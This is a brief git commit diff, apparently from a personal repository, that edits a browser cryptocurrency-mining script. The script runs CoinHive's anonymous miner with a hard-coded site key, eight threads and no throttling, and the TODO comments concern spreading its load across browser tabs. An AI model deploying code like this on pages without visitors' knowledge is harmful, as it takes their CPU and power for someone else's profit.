420d978c31caa04d166d925e22e207afd7b9f46d
Shiva, Lord of Destruction <laurence.a.maddox@gmail.com>
2017-12-23 04:05:11 -0600

    daily backup

--- miner-min.js
+++ miner-min.js
@@ -1,4 +1,5 @@
-// TODO detect other running instances
+// TODO failover to authed
+// TODO determine a way to reasonable distribute resources among tabs
 // TODO autotune parameters
 var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: 8, throttle: 0.0});
-miner.start ();
+miner.start (CoinHive.IF_EXCLUSIVE_TAB);
